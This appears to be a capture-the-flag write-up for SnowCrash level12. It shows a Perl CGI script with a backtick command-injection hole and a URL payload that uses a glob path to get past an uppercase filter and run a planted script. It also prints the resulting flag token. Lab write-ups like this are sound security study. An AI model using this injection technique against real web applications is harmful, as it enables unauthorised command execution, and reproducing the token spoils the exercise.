# Flag12

```
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
Here we have a script in Perl asking to connect to port 4646.
We have a `param("x")` and we can't pass `bash` in `param()`, but we can pass:
```
$xx =~ tr/a-z/A-Z/; 
$xx =~ s/\s.*//;
```
Thus at first we try to type on the browser the URI `localhost:4646?x='abc'` to be sure to have a response.
It works.
To get the flag we have to make a script and pass its path in the `param()` function:
```
level12@SnowCrash:/tmp$ cat M
#!/bin/sh
getflag | wall
level12@SnowCrash:/tmp$ chmod 777 M
```
In the browser search bar we type the URL http://localhost:4646/?x='`/*/M`' and we get the flag in the terminal:
```
Broadcast Message from flag12@Snow
        (somewhere) at 18:04 ...

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr


level12@SnowCrash:~$ su level13
Password:
level13@SnowCrash:~$
```